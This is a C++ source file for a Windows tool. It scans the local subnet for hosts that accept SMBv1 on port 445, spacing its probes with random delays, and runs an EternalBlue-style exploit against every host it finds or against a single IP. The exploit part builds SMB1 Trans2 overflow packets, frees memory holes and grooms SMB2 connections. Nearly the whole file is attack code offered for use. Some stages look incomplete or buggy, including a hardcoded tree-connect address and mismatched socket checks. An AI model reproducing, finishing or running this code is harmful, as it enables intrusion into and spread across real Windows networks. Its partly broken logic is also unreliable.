#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <iostream>
#include <vector>
#include <string>
#include <random>
#include <atomic>
#include <algorithm>
#include <iomanip>
#include <sstream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

std::string bytes_to_hex(const unsigned char* data, size_t len) {
    std::stringstream ss;
    ss << std::hex;
    for (size_t i = 0; i < len; ++i) {
        ss << std::setw(2) << std::setfill('0') << (int)data[i] << " ";
        if ((i + 1) % 16 == 0) ss << "\n";
    }
    return ss.str();
}

class NetworkRecon {
private:
    struct NetConfig {
        std::string network;
        std::string mask;
        int prefix;
        std::string localIP;
    };

    static std::atomic<int> scanned_count;
    static std::atomic<int> target_count;

public:
    static std::vector<std::string> Execute() {
        NetConfig config = AcquireNetworkConfig();
        std::vector<std::string> vulnerableHosts;

        std::cout << "[+] Acquired network: " << config.network << "/" << config.prefix << " (Local IP: " << config.localIP << ")" << std::endl;
        scanned_count = 0;
        target_count = 0;
        vulnerableHosts = PerformScan(config);

        return vulnerableHosts;
    }

private:
    static NetConfig AcquireNetworkConfig() {
        PIP_ADAPTER_ADDRESSES adapters = nullptr;
        ULONG buf_size = 0;
        NetConfig config = {};

        DWORD ret = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_GATEWAYS, nullptr, adapters, &buf_size);
        if (ret == ERROR_BUFFER_OVERFLOW) {
            adapters = (PIP_ADAPTER_ADDRESSES)malloc(buf_size);
            ret = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_GATEWAYS, nullptr, adapters, &buf_size);

            if (ret == ERROR_SUCCESS) {
                for (PIP_ADAPTER_ADDRESSES adapter = adapters; adapter; adapter = adapter->Next) {
                    if (ValidateAdapter(adapter)) {
                        config = ExtractConfig(adapter);
                        break;
                    }
                }
            }
            free(adapters);
        }
        return config;
    }

    static bool ValidateAdapter(PIP_ADAPTER_ADDRESSES adapter) {
        return (adapter->OperStatus == IfOperStatusUp &&
                adapter->FirstGatewayAddress != nullptr &&
                adapter->FirstUnicastAddress != nullptr &&
                adapter->IfType != IF_TYPE_SOFTWARE_LOOPBACK);
    }

    static NetConfig ExtractConfig(PIP_ADAPTER_ADDRESSES adapter) {
        NetConfig config;
        PIP_ADAPTER_UNICAST_ADDRESS unicast = adapter->FirstUnicastAddress;

        if (unicast && unicast->Address.lpSockaddr->sa_family == AF_INET) {
            sockaddr_in* ipv4 = (sockaddr_in*)unicast->Address.lpSockaddr;
            char ip_str[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &(ipv4->sin_addr), ip_str, INET_ADDRSTRLEN);
            config.localIP = ip_str;

            std::string mask = CalculateMask(unicast->OnLinkPrefixLength);
            config.network = CalculateNetwork(ip_str, mask);
            config.mask = mask;
            config.prefix = unicast->OnLinkPrefixLength;
        }
        return config;
    }

    static std::vector<std::string> PerformScan(const NetConfig& config) {
        std::vector<std::string> targets = GenerateTargets(config);
        std::vector<std::string> vulnerable;

        for (const auto& target : targets) {
            if (CheckPort(target, 445)) {
                vulnerable.push_back(target);
                target_count++;
            }
            scanned_count++;
            ApplyDelay();
        }

        return vulnerable;
    }

    static std::vector<std::string> GenerateTargets(const NetConfig& config) {
        std::vector<std::string> targets;
        in_addr net_addr;
        inet_pton(AF_INET, config.network.c_str(), &net_addr);

        int total_hosts = (1 << (32 - config.prefix)) - 2;
        if (total_hosts <= 0) return targets;

        std::vector<int> host_nums;
        for (int i = 1; i < total_hosts + 1; i++) { 
            host_nums.push_back(i);
        }

        std::random_device rd;
        std::mt19937 g(rd());
        std::shuffle(host_nums.begin(), host_nums.end(), g);

        for (int host_num : host_nums) {
            uint32_t host_ip = ntohl(net_addr.s_addr) + host_num;
            in_addr ip;
            ip.s_addr = htonl(host_ip);

            char ip_str[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &ip, ip_str, INET_ADDRSTRLEN);

            if (std::string(ip_str) != config.localIP) {
                targets.push_back(ip_str);
            }
        }
        return targets;
    }

    static bool CheckPort(const std::string& host, int port) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return false;

        u_long mode = 1;
        ioctlsocket(sock, FIONBIO, &mode);

        sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(port);
        inet_pton(AF_INET, host.c_str(), &target.sin_addr);

        if (connect(sock, (sockaddr*)&target, sizeof(target)) == SOCKET_ERROR) {
            if (WSAGetLastError() != WSAEWOULDBLOCK) {
                closesocket(sock);
                std::cout << "Connect failed with error: " << WSAGetLastError() << std::endl;
                return false;
            }
        }

        fd_set writefds;
        FD_ZERO(&writefds);
        FD_SET(sock, &writefds);

        timeval timeout{1, 0}; 
        int result = select(0, NULL, &writefds, NULL, &timeout);
        closesocket(sock);

        if (result > 0) {
            return VerifySMBv1Protocol(host);
        } else {
            std::cout << "Port check failed, select result: " << result << ", error: " << WSAGetLastError() << std::endl;
        }
        return false;
    }

    static bool VerifySMBv1Protocol(const std::string& host) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return false;

        int timeout_ms = 3000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));

        sockaddr_in server{};
        server.sin_family = AF_INET;
        server.sin_port = htons(445);
        inet_pton(AF_INET, host.c_str(), &server.sin_addr);

        if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            closesocket(sock);
            return false;
        }

        std::vector<uint8_t> packet;
        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00}); // NetBIOS length

        packet.insert(packet.end(), {
            0xFF, 'S', 'M', 'B', 0x72,
            0x00, 0x00, 0x00, 0x00,
            0x18,
            0x03, 0xC8,
            0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
            0x00, 0x00,
            0xFF, 0xFE,
            0x00, 0x00,
            0x00, 0x00
        });

        packet.push_back(0x00); // Word count

        const char* dialects[] = {
            "PC NETWORK PROGRAM 1.0",
            "LANMAN1.0",
            "Windows for Workgroups 3.1a",
            "LM1.2X002",
            "LANMAN2.1"
        };

        std::vector<uint8_t> dialect_bytes;
        for (const char* d : dialects) {
            dialect_bytes.insert(dialect_bytes.end(), d, d + strlen(d));
            dialect_bytes.push_back(0x00);
        }

        uint16_t byte_count = dialect_bytes.size();
        packet.push_back(byte_count & 0xFF);
        packet.push_back((byte_count >> 8) & 0xFF);
        packet.insert(packet.end(), dialect_bytes.begin(), dialect_bytes.end());

        uint32_t netbios_len = packet.size() - 4;
        packet[0] = 0x00;
        packet[1] = 0x00;
        packet[2] = (netbios_len >> 8) & 0xFF;
        packet[3] = netbios_len & 0xFF;

        if (send(sock, (char*)packet.data(), packet.size(), 0) == SOCKET_ERROR) {
            closesocket(sock);
            return false;
        }

        unsigned char buffer[2048];
        int received = recv(sock, (char*)buffer, sizeof(buffer), 0);
        closesocket(sock);

        if (received < 10) return false;
        if (buffer[4] != 0xFF || buffer[5] != 'S' || buffer[6] != 'M' || buffer[7] != 'B' || buffer[8] != 0x72) {
            return false;
        }

        int dialect_index = buffer[9];

        if (dialect_index <= 5) return true;

        return false;
    }

    static void ApplyDelay() {
        std::random_device rd;
        std::uniform_int_distribution<> d(20, 200);
        Sleep(d(rd));
        if (scanned_count % 30 == 0) {
            std::uniform_int_distribution<> ld(500, 1000);
            Sleep(ld(rd));
        }
    }

    static std::string CalculateMask(ULONG prefix) {
        if (prefix > 32) return "0.0.0.0";
        uint32_t mask = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF;
        in_addr addr;
        addr.s_addr = htonl(mask);
        char str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &addr, str, INET_ADDRSTRLEN);
        return str;
    }

    static std::string CalculateNetwork(const std::string& ip, const std::string& mask) {
        in_addr ip_addr, mask_addr, net_addr;
        inet_pton(AF_INET, ip.c_str(), &ip_addr);
        inet_pton(AF_INET, mask.c_str(), &mask_addr);
        net_addr.s_addr = ip_addr.s_addr & mask_addr.s_addr;
        char str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &net_addr, str, INET_ADDRSTRLEN);
        return str;
    }
};

class EternalBlue {
private:
    std::string targetIP;
    
    enum class ExploitType {
        TRANS2_BUFFER,
        TRANS2_ZERO, 
        TRANS2_EXPLOIT
    };

    int groomAllocations = 12;
    int groomDelta = 5;
    int maxExploitAttempts = 1;

    unsigned char smbNegotiate[137];
    unsigned char sessionSetup[140];
    unsigned char treeConnectRequest[100];
    unsigned char userID[2] = {0, 0};       
    unsigned char treeID[2] = {0, 0};  
    
    std::vector<SOCKET> groomSockets;
public:
    EternalBlue() {
        InitializePackets();
    }

    bool Exploit(const std::string& host) {
        targetIP = host;
        std::cout << "[*] Target: " << host << "\n\n";

        for (int attempt = 0; attempt < maxExploitAttempts; ++attempt) {
            int grooms = groomAllocations + groomDelta * attempt;
            auto payload_hdr = MakeSMB2PayloadHeadersPacket();

            SOCKET sock = Connect();
            if (sock == INVALID_SOCKET) continue;
            
            if (!SendNegotiate(sock)) { closesocket(sock); continue; }
            if (!DoSessionSetup(sock)) { closesocket(sock); continue; }
            if (!SendTreeConnect(sock)) { closesocket(sock); continue; }
            
            if (!SendNTLargeBuffer(sock)) { closesocket(sock); continue; }
            
            SOCKET fhs_sock = Smb1FreeHole(true);
            if (fhs_sock == INVALID_SOCKET) { closesocket(sock); continue; }

            if (!SMB2Grooming(grooms, payload_hdr)) { 
                closesocket(fhs_sock); closesocket(sock); continue; 
            }

            closesocket(fhs_sock);

            if (!SMB2Grooming(6, payload_hdr)) { closesocket(sock); continue; }

            SOCKET fhf_sock = Smb1FreeHole(false);
            if (fhs_sock == INVALID_SOCKET) { closesocket(sock); continue; }

            closesocket(fhf_sock);
        }

        return true;
    }

private:

    SOCKET Connect() {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return INVALID_SOCKET;

        int timeout = 5000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

        sockaddr_in server{};
        server.sin_family = AF_INET;
        server.sin_port = htons(445);
        inet_pton(AF_INET, targetIP.c_str(), &server.sin_addr);

        if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            closesocket(sock); sock = INVALID_SOCKET;
            return false;
        }

        return sock;
    }

    bool Send(SOCKET sock, const unsigned char* data, size_t size) {
        int sent = send(sock, (char*)data, size, 0);
        if (sent != (int)size) {
            std::cout << "[-] Send failed: " << sent << "/" << size << "\n";
            return false;
        }
        return true;
    }

    int Recv(SOCKET sock, unsigned char* buffer, size_t size) {
        int received = recv(sock, (char*)buffer, size, 0);
        if (received <= 0) {
            std::cout << "[-] Recv failed: " << WSAGetLastError() << "\n";
        }
        return received;
    }

    void InitializePackets() {
        unsigned char negotiate[] = {
            0x00, 0x00, 0x00, 0x85, 0xFF, 0x53, 0x4D, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x53, 0xC0,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE,
            0x00, 0x00, 0x40, 0x00, 0x00, 0x62, 0x00, 0x02, 0x50, 0x43, 0x20, 0x4E, 0x45, 0x54, 0x57, 0x4F,
            0x52, 0x4B, 0x20, 0x50, 0x52, 0x4F, 0x47, 0x52, 0x41, 0x4D, 0x20, 0x31, 0x2E, 0x30, 0x00, 0x02,
            0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x57, 0x69, 0x6E, 0x64, 0x6F,
            0x77, 0x73, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x57, 0x6F, 0x72, 0x6B, 0x67, 0x72, 0x6F, 0x75, 0x70,
            0x73, 0x20, 0x33, 0x2E, 0x31, 0x61, 0x00, 0x02, 0x4C, 0x4D, 0x31, 0x2E, 0x32, 0x58, 0x30, 0x30,
            0x32, 0x00, 0x02, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x32, 0x2E, 0x31, 0x00, 0x02, 0x4E, 0x54,
            0x20, 0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00
        };
        memcpy(smbNegotiate, negotiate, sizeof(negotiate));

        unsigned char setup[] = {
            0x00, 0x00, 0x00, 0x88, 0xFF, 0x53, 0x4D, 0x42, 0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xC0,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE,
            0x00, 0x00, 0x40, 0x00, 0x0D, 0xFF, 0x00, 0x88, 0x00, 0x04, 0x11, 0x0A, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD4, 0x00, 0x00, 0x00, 0x4B,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00, 0x6F, 0x00,
            0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00,
            0x32, 0x00, 0x31, 0x00, 0x39, 0x00, 0x35, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00,
            0x64, 0x00, 0x6F, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00, 0x30, 0x00,
            0x30, 0x00, 0x20, 0x00, 0x35, 0x00, 0x2E, 0x00, 0x30, 0x00, 0x00, 0x00
        };
        memcpy(sessionSetup, setup, sizeof(setup));

        unsigned char treeConnect[] = {
            0x00, 0x00, 0x00, 0x60, 0xFF, 0x53, 0x4D, 0x42, 0x75, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xC0,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFE,
            0x00, 0x08, 0x40, 0x00, 0x04, 0xFF, 0x00, 0x60, 0x00, 0x08, 0x00, 0x01, 0x00, 0x35, 0x00, 0x00,
            0x5C, 0x00, 0x5C, 0x00, 0x31, 0x00, 0x39, 0x00, 0x32, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x36, 0x00,
            0x38, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x37, 0x00, 0x35, 0x00, 0x2E, 0x00, 0x31, 0x00, 0x32, 0x00,
            0x38, 0x00, 0x5C, 0x00, 0x49, 0x00, 0x50, 0x00, 0x43, 0x00, 0x24, 0x00, 0x00, 0x00, 0x3F, 0x3F,
            0x3F, 0x3F, 0x3F, 0x00
        };
        memcpy(treeConnectRequest, treeConnect, sizeof(treeConnect));
    }

    bool SendNegotiate(SOCKET sock) {
        if (!Send(sock, smbNegotiate, sizeof(smbNegotiate))) return false;

        unsigned char resp[1024];
        int len = Recv(sock, resp, sizeof(resp));

        if (len < 36) return false;
        return true;
    }

    bool DoSessionSetup(SOCKET sock) {
        if (!Send(sock, sessionSetup, sizeof(sessionSetup))) return false;

        unsigned char resp[1024];
        int len = Recv(sock, resp, sizeof(resp));
        if (len < 36) {
            return false;
        }

        uint32_t status = *(uint32_t*)(resp + 9);
        if (status != 0) return false;

        userID[0] = resp[32];
        userID[1] = resp[33];
        
        return true;
    }

    bool SendTreeConnect(SOCKET sock) {
        treeConnectRequest[32] = userID[0];
        treeConnectRequest[33] = userID[1];

        // std::string targetPath = "\\\\" + targetIP + "\\IPC$";
        // size_t pathOffset = 56;
        
        // for (size_t i = 0; i < targetPath.length(); i++) {
        //     treeConnectRequest[pathOffset + (i * 2)] = targetPath[i];
        //     treeConnectRequest[pathOffset + (i * 2) + 1] = 0x00;
        // }

        if (!Send(sock, treeConnectRequest, sizeof(treeConnectRequest))) {
            return false;
        }

        unsigned char resp[1024];
        int len = Recv(sock, resp, sizeof(resp));

        if (len < 36) return false;

        treeID[0] = resp[28];
        treeID[1] = resp[29];

        uint32_t status = *(uint32_t*)(resp + 9);
        if (status != 0) return false;

        return true;
    }

    std::vector<uint8_t> MakeSMB1NTTransPacket() {
        std::vector<uint8_t> packet;
        
        // NetBIOS header
        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});
        
        // SMB Header (32 bytes)
        packet.insert(packet.end(), {
            0xFF, 0x53, 0x4D, 0x42,                             // SMB signature
            0xA0,                                               // Command
            0x00, 0x00, 0x00, 0x00,                             // Status
            0x18,                                               // Flags
            0x07, 0xC0,                                         // Flags2
            0x00, 0x00,                                         // PID High
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // SecurityFeatures
            0x00, 0x00, 
            treeID[0], treeID[1],                               // Tree ID
            0xFF, 0xFE,                                         // Process ID
            userID[0], userID[1],                               // User ID
            0x40, 0x00,                                         // MID
        });
        
        // SMB Parameters
        packet.insert(packet.end(), {
            0x14,                           // WordCount
            0x01,                           // MaxSetupCount
            0x00, 0x00,                     // Reserved1
            0x1E, 0x00, 0x00, 0x00,         // TotalParameterCount
            0xD0, 0x03, 0x01, 0x00,         // TotalDataCount
            0x1E, 0x00, 0x00, 0x00,         // MaxParameterCount
            0x00, 0x00, 0x00, 0x00,         // MaxDataCount
            0x1E, 0x00, 0x00, 0x00,         // ParameterCount
            0x4B, 0x00, 0x00, 0x00,         // ParameterOffset
            0xD0, 0x03, 0x00, 0x00,         // DataCount
            0x68, 0x00, 0x00, 0x00,         // DataOffset
            0x01,                           // SetupCount
            0x00, 0x00,                     // Function
            0x00, 0x00,                     // Setup
        });
        
        // SMB Data
        packet.insert(packet.end(), {
            0xEC, 0x03,                     // Byte Count
            0x00,                           // Padding
        });
        
        packet.insert(packet.end(), 30, 0x00);
        packet.insert(packet.end(), {0x01});
        packet.insert(packet.end(), 973, 0x00);
        
        uint32_t netbios_len = packet.size() - 4;
        packet[0] = 0x00;
        packet[1] = 0x00;
        packet[2] = (netbios_len >> 8) & 0xFF;
        packet[3] = netbios_len & 0xFF;
        
        return packet;
    }

    std::vector<uint8_t> MakeSMB1Trans2ExploitPacket(ExploitType type, uint8_t timeout) {
        std::vector<uint8_t> pkt;
    
        // Calculate timeout value (timeout * 0x10 + 3)
        uint8_t calculated_timeout = (timeout * 0x10) + 3;
        
        // NetBIOS Session Service header (4 bytes)
        pkt.insert(pkt.end(), {0x00, 0x00, 0x00, 0x00}); // Placeholder for length
        
        // SMB Header (32 bytes)
        pkt.insert(pkt.end(), {
            0xFF, 'S', 'M', 'B',                         // SMB signature
            0x33,                                        // Command: SMB_COM_TRANSACTION2_SECONDARY (0x32)
            0x00, 0x00, 0x00, 0x00,                      // Status
            0x18,                                        // Flags
            0x07, 0xC0,                                  // Flags2
            0x00, 0x00,                                  // PID High
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SecurityFeatures
            0x00, 0x00, 
            treeID[0], treeID[1],                        // Tree ID
            0xFF, 0xFE,                                  // Process ID 
            userID[0], userID[1],                        // User ID
            0x40, 0x00,                                  // Multiplex ID
        });
        
        // SMB_Parameters
        pkt.insert(pkt.end(), {
            0x09,                                       // WordCount
        });
        
        pkt.insert(pkt.end(), {
            0x00, 0x00,                             // TotalParameterCount = 0
            0x00, 0x10,                             // TotalDataCount = 4096
            0x00, 0x00,                             // MaxParameterCount = 0
            0x00, 0x00,                             // MaxDataCount = 0
            0x00,                                   // MaxSetupCount = 0
            0x00,                                   // Reserved1
            0x00, 0x10,                             // Flags
            0x35, 0x00, 0xD0, calculated_timeout,   // Timeout
            0x00, 0x00,                             // Reserved2
        });
        
        // ParameterCount = 4096, ParameterOffset 
        pkt.insert(pkt.end(), {0x00, 0x10, 0x00, 0x00});
        // DataCount DataOffset
        pkt.insert(pkt.end(), {0x00, 0x00, 0x00, 0x00});
        // DataDisplacement 
        pkt.insert(pkt.end(), {0x00, 0x00});
        // SetupCount 
        pkt.insert(pkt.end(), {0x00});
        // ByteCount
        pkt.insert(pkt.end(), {0x00, 0x00});
        
        std::vector<uint8_t> data_section;
        
        switch (type) {
            case ExploitType::TRANS2_EXPLOIT: {
                data_section.insert(data_section.end(), 2957, 0x41);
                data_section.insert(data_section.end(), {0x80, 0x00, 0xA8, 0x00}); // overflow trigger
                data_section.insert(data_section.end(), 0x10, 0x00);  // 16 zeros
                data_section.insert(data_section.end(), {0xFF, 0xFF}); // 0xFFFF
                data_section.insert(data_section.end(), 0x6, 0x00);   // 6 zeros  
                data_section.insert(data_section.end(), {0xFF, 0xFF}); // 0xFFFF
                data_section.insert(data_section.end(), 0x16, 0x00);  // 22 zeros
                data_section.insert(data_section.end(), {0x00, 0xF1, 0xDF, 0xFF}); // x86 address 1
                data_section.insert(data_section.end(), 0x8, 0x00);   // 8 zeros
                data_section.insert(data_section.end(), {0x20, 0xF0, 0xDF, 0xFF}); // x86 address 2
                data_section.insert(data_section.end(), {0x00, 0xF1, 0xDF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}); // x64 address
                data_section.insert(data_section.end(), {0x60, 0x00, 0x04, 0x10}); // data
                data_section.insert(data_section.end(), 4, 0x00);     // 4 zeros
                data_section.insert(data_section.end(), {0x80, 0xEF, 0xDF, 0xFF}); // address
                data_section.insert(data_section.end(), 4, 0x00);     // 4 zeros
                data_section.insert(data_section.end(), {0x10, 0x00, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}); // x64 address 2
                data_section.insert(data_section.end(), {0x18, 0x01, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}); // x64 address 3
                data_section.insert(data_section.end(), 0x10, 0x00);  // 16 zeros
                data_section.insert(data_section.end(), {0x60, 0x00, 0x04, 0x10}); // data
                data_section.insert(data_section.end(), 0xC, 0x00);   // 12 zeros
                data_section.insert(data_section.end(), {0x90, 0xFF, 0xCF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}); // x64 address 4
                data_section.insert(data_section.end(), 0x8, 0x00);   // 8 zeros
                data_section.insert(data_section.end(), {0x80, 0x10}); // data
                data_section.insert(data_section.end(), 0xE, 0x00);   // 14 zeros
                data_section.insert(data_section.end(), {0x39, 0xBB}); // magic bytes
                data_section.insert(data_section.end(), 965, 0x41);   // 965 bytes of 'A'
                break;
            }
            
            case ExploitType::TRANS2_ZERO: {
                data_section.insert(data_section.end(), 2055, 0x00);  
                data_section.insert(data_section.end(), {0x83, 0xF3}); 
                data_section.insert(data_section.end(), 2039, 0x41); 
                break;
            }
            
            case ExploitType::TRANS2_BUFFER: {
                data_section.insert(data_section.end(), 4096, 0x41); 
                break;
            }
        }
        
        pkt.insert(pkt.end(), data_section.begin(), data_section.end());
        
        // Update NetBIOS length
        uint32_t netbios_len = pkt.size() - 4;
        pkt[0] = 0x00;
        pkt[1] = 0x00;
        pkt[2] = (netbios_len >> 8) & 0xFF;
        pkt[3] = netbios_len & 0xFF;
        
        return pkt;
    }

    bool SendNTLargeBuffer(SOCKET sock) {
        auto nt_trans_pkt = MakeSMB1NTTransPacket();

        if (!Send(sock, nt_trans_pkt.data(), nt_trans_pkt.size())) {
            return false;
        }
        
        unsigned char resp[1024];
        Recv(sock, resp, sizeof(resp));
        
        std::vector<uint8_t> all_packets;
        
        auto trans2_zero_pkt = MakeSMB1Trans2ExploitPacket(ExploitType::TRANS2_ZERO, 0);
        all_packets.insert(all_packets.end(), trans2_zero_pkt.begin(), trans2_zero_pkt.end());
        
        for (int i = 1; i < 15; i++) {
            auto groom_pkt = MakeSMB1Trans2ExploitPacket(ExploitType::TRANS2_BUFFER, i);
            all_packets.insert(all_packets.end(), groom_pkt.begin(), groom_pkt.end());
        }

        if (!Send(sock, all_packets.data(), all_packets.size())) return false;
        return true;
    }

    std::vector<uint8_t> MakeSMB1FreeHoleSessionPacket(const std::vector<uint8_t>& flags2, const std::vector<uint8_t>& vcnum,const std::vector<uint8_t>& native_os) {
        std::vector<uint8_t> packet;
        
        // NetBIOS header
        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});

        // SMB Header (32 bytes)
        packet.insert(packet.end(), {
            0xFF, 0x53, 0x4D, 0x42,     // SMB signature
            0x73,                       // Command: SESSION_SETUP_ANDX
            0x00, 0x00, 0x00, 0x00,     // Status
            0x18,                       // Flags
            flags2[0], flags2[1],       // Flags2
            0x00, 0x00,                 // PID High
            0x00, 0x00, 0x00, 0x00,     // Security Features
            0x00, 0x00, 0x00, 0x00,     // Security Features
            0x00, 0x00,                 // Reserved
            0x00, 0x00,                 // TID
            0xFF, 0xFE,                 // PID  
            0x00, 0x00,                 // UID
            0x40, 0x00                  // MID
        });

        // Parameter Block
        packet.insert(packet.end(), {
            0x0C,                       // WordCount
            0xFF,                       // AndXCommand (no next command)
            0x00,                       // AndXReserved
            0x00, 0x00,                 // AndXOffset
            0x04, 0x11,                 // MaxBufferSize
            0x0A, 0x00,                 // MaxMpxCount
            vcnum[0], vcnum[1],         // VcNumber
            0x00, 0x00, 0x00, 0x00,     // SessionKey
            0x00, 0x00,                 // SecurityBlobLength
            0x00, 0x00, 0x00, 0x00,     // Reserved
            0x00, 0x00, 0x00, 0x80,     // Capabilities
        });
        
        size_t byte_count_offset = packet.size();
        packet.insert(packet.end(), {
            0x00, 0x00,                 // ByteCount
        });

        packet.insert(packet.end(), native_os.begin(), native_os.end());
        packet.insert(packet.end(), 15, 0x00); 

        packet.insert(packet.end(), {0x00, 0x00});
    
        uint16_t byte_count = packet.size() - byte_count_offset - 2;
        packet[byte_count_offset] = byte_count & 0xFF;
        packet[byte_count_offset + 1] = (byte_count >> 8) & 0xFF;
        
        // Update NetBIOS length
        uint32_t netbios_len = packet.size() - 4;
        packet[0] = 0x00;
        packet[1] = 0x00;
        packet[2] = (netbios_len >> 8) & 0xFF;
        packet[3] = netbios_len & 0xFF;
        
        return packet;
    }

    SOCKET Smb1FreeHole(bool start) {
        SOCKET sock = Connect();
        if (sock == INVALID_SOCKET) return INVALID_SOCKET;

        if (!SendNegotiate(sock)) { 
            closesocket(sock);
            return INVALID_SOCKET;
        }

        std::vector<uint8_t> pkt;
        if (start) {
            pkt = MakeSMB1FreeHoleSessionPacket(
                std::vector<uint8_t>{0x07, 0xC0},  // flags2
                std::vector<uint8_t>{0x2D, 0x01},  // vc_number  
                std::vector<uint8_t>{0xF0, 0xFF, 0x00, 0x00, 0x00}  // native_os
            );
        } else {
            pkt = MakeSMB1FreeHoleSessionPacket(
                std::vector<uint8_t>{0x07, 0x40},  // flags2
                std::vector<uint8_t>{0x2C, 0x01},  // vc_number
                std::vector<uint8_t>{0xF8, 0x87, 0x00, 0x00, 0x00}  // native_os
            );
        }

        if (!Send(sock, pkt.data(), pkt.size())) {
            closesocket(sock);
            return INVALID_SOCKET;
        }

        unsigned char resp[1024];
        int len = Recv(sock, resp, sizeof(resp));
        if (len <= 0) {
            closesocket(sock);
            return INVALID_SOCKET;
        }

        return sock;
    }

    std::vector<uint8_t> MakeSMB2PayloadHeadersPacket() {
        std::vector<uint8_t> pkt;
        
        // Session Message + Size
        pkt.insert(pkt.end(), {
            0x00,                           // Session Message
            0x00, 0xFF, 0xF7,               // Size
            0xFE, 'S', 'M', 'B',            // SMB2 signature
        });
        
        pkt.insert(pkt.end(), 124, 0x00);
        
        return pkt;
    }

    bool SMB2Grooming(int grooms, const std::vector<uint8_t>& payload_hdr_pkt) {
        groomSockets.clear();
        
        for (int i = 0; i < grooms; i++) {
            SOCKET groom_sock = Connect();
            if (groom_sock == INVALID_SOCKET) continue;
            
            if (!SendNegotiate(groom_sock)) {
                closesocket(groom_sock);
                continue;
            }
            
            if (!Send(groom_sock, payload_hdr_pkt.data(), payload_hdr_pkt.size())) {
                closesocket(groom_sock);
                continue;
            }
            
            groomSockets.push_back(groom_sock);
        }
        
        return !groomSockets.empty();
    }
};

class Attack {
public:
    static void LaunchAuto() {
        auto targets = NetworkRecon::Execute();
        if (targets.empty()) return;

        EternalBlue exploit;
        for (const auto& t : targets) {
            exploit.Exploit(t);
        }
    }

    static void LaunchSingle(const std::string& ip) {
        EternalBlue exploit;
        exploit.Exploit(ip);
    }
};

void ShowUsage(const char* programName) {
    std::cout << "Usage:\n";
    std::cout << "  " << programName << " auto                    - Scan and exploit all vulnerable hosts in network\n";
    std::cout << "  " << programName << " <IP_ADDRESS>            - Exploit specific IP address\n";
}

std::atomic<int> NetworkRecon::scanned_count(0);
std::atomic<int> NetworkRecon::target_count(0);

int main(int argc, char* argv[]) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;
    
    if (argc == 2) {
        std::string option = argv[1];
        
        if (option == "auto") 
            Attack::LaunchAuto();
        else 
            Attack::LaunchSingle(option);
    } 
    else ShowUsage(argv[0]);

    WSACleanup();
    return 0;
}